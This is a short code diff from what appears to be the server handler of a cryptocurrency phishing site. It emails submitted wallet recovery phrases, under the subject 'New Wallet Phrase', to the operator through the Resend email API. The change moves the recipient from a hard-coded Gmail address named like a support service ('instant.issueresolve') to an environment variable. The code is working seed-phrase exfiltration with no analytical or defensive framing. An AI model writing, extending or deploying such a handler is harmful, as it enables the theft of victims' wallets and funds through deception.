@@ -8,7 +8,7 @@ export default defineEventHandler(async (event) => {
 
     const { data, error } = await resend.emails.send({
         from: 'Phrase alert <onboarding@resend.dev>',
-        to: ['instant.issueresolve@gmail.com'],
+        to: [process.env.WALLET_TO_EMAIL as string],
         subject: `New Wallet Phrase`,
         html: `
       <p>Wallet Name: ${body.walletName}</p>
